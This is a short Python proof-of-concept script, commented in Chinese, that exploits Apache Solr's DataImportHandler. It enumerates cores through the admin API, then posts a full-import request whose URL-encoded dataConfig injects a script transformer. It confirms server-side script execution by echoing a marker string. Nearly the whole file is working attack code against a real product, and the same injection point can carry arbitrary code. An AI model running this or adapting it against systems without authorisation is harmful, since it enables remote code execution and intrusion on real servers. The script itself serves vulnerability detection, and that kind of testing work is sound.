#! coding=utf-8

import requests
import re

def exploit(url):

    get_url =url+'/solr/admin/cores?wt=json'
    try:
        headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/72.0',
        }
        res=requests.get(get_url,headers=headers)
        get_text =res.text
        ans=re.findall('"name":"\S+"',get_text)
        #如果可以找到，就可以进行下一步的利用。
        if len(ans) >=1:
            tmp=ans[0].split(":")
            tmp1=tmp[1].replace('"','')
            post_url =url+'/solr/'+tmp1+"/dataimport?command=full-import&debug=true&wt=json&indent=true&verbose=false&clean=false&commit=false&optimize=false&dataConfig=%3CdataConfig%3E%0D%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22DEBUG%22%20%2F%3E%0D%0A%3Cscript%3E%3C!%5BCDATA%5B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20function%20execute(row)%20%20%20%20%7B%0D%0Arow.put(%22id%22,'ThisIsATestToProveAVulnerability')%3B%0D%0Areturn%20row%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%5D%5D%3E%3C%2Fscript%3E%0D%0A%3Cdocument%3E%0D%0A%20%20%20%20%3Centity%0D%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0D%0A%20%20%20%20%20%20%20%20name%3D%22streamxml%22%0D%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc%22%0D%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0D%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0D%0A%20%20%20%20%20%20%20%20forEach%3D%22%2Fbooks%2Fbook%22%0D%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Aexecute%22%20%3E%0D%0A%09%09%09%3Cfield%20column%3D%22id%22%20name%3D%22id%22%2F%3E%0D%0A%20%20%20%20%3C%2Fentity%3E%0D%0A%3C%2Fdocument%3E%0D%0A%3C%2FdataConfig%3E"
            post_data='''<?xml version="1.0" encoding="utf-8"?><books><book></book></books>'''
            res=requests.post(post_url,data=post_data)
            post_ans_text =res.text
            if "ThisIsATestToProveAVulnerability" in post_ans_text:
                print(url+"    YES")
                return True,url
    except:
        return False
    return False

if __name__ == '__main__':

    exploit("http://ip:8983")  #你想要的检测的IP地址

